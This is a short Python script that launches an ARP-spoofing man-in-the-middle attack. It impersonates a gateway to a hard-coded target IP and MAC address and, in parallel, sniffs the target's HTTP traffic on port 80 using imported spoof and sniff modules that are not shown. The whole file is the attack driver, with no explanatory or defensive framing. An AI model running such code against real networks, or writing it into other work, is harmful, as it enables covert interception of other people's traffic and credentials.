from multiprocessing import Pool
from network import arp, sniff

def run(i):
    i.run()

if __name__ == '__main__':
    p = Pool(2)
    
    target = ["128.113.222.83", "08:00:27:6e:2e:1a"]
    # target = ["0.0.0.0", "ff:ff:ff:ff:ff:ff"]
    
    gateway = arp.spoof("128.113.223.254", "f0:de:f1:01:8e:8a")
    gateway.setTarget(*target)
    
    watch = sniff.watch(target[0], 80)

    p.map(run, [gateway, watch])
